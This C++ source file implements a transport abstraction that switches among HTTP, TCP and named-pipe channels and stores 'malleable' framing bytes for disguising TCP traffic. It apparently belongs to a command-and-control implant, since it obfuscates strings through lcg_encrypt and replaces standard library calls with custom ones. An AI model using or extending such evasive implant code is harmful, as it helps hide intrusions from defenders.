/*
 * transport.cpp: Transport abstraction layer implementation
 *
 * Provides setTransport()/getTransport() for swapping between
 * HTTP (winhttpRequest) and TCP (tcpSocketRequest) at runtime.
 */

#include "../../include/network/transport.h"
#include "../../include/utils.h"
#include "../bastia/bastia.h"
#include "../../include/generated_config.h"

#ifdef PANDRAGON_ENABLE_PIPE
#include "pipe_transport.h"
#endif

// Default transport: WinHTTP (backward compatible)
#ifdef PANDRAGON_ENABLE_HTTP
static TransportRequestFn g_transport = winhttpRequest;
#else
static TransportRequestFn g_transport = nullptr;
#endif

// Track transport type for protocol-specific encoding decisions
// "http" (default) vs "tcp" vs "pipe"
static bool g_is_tcp = false;
static bool g_is_pipe = false;

void setTransport(TransportRequestFn fn) {
    if (fn) {
        g_transport = fn;
    }
}

TransportRequestFn getTransport(void) {
    return g_transport;
}

void setTransportType(const char* type) {
    if (!type) return;
    g_is_tcp = (__strcmp(type, lcg_encrypt("tcp")) == 0);
    g_is_pipe = (__strcmp(type, lcg_encrypt("pipe")) == 0);
}

bool isTcpTransport(void) {
    return g_is_tcp;
}

bool isPipeTransport(void) {
    return g_is_pipe;
}

// =============================================================================
// TCP Malleable (per-session prefix/suffix for raw TCP framing)
// =============================================================================
// Static storage: no malloc, set once during channel activation.
// Max 256 bytes each (enough for protocol framing, SMTP headers, etc.)

static uint8_t g_tcp_prefix[256] = {0};
static size_t  g_tcp_prefix_len  = 0;
static uint8_t g_tcp_suffix[256] = {0};
static size_t  g_tcp_suffix_len  = 0;

void setTcpMalleable(const void* prefix, size_t prefixLen, const void* suffix, size_t suffixLen) {
    if (prefix && prefixLen > 0 && prefixLen <= 256) {
        __memcpy(g_tcp_prefix, prefix, prefixLen);
        g_tcp_prefix_len = prefixLen;
    } else {
        g_tcp_prefix_len = 0;
    }

    if (suffix && suffixLen > 0 && suffixLen <= 256) {
        __memcpy(g_tcp_suffix, suffix, suffixLen);
        g_tcp_suffix_len = suffixLen;
    } else {
        g_tcp_suffix_len = 0;
    }
}

const void* getTcpMalleablePrefix(void)   { return g_tcp_prefix; }
size_t      getTcpMalleablePrefixLen(void) { return g_tcp_prefix_len; }
const void* getTcpMalleableSuffix(void)   { return g_tcp_suffix; }
size_t      getTcpMalleableSuffixLen(void) { return g_tcp_suffix_len; }
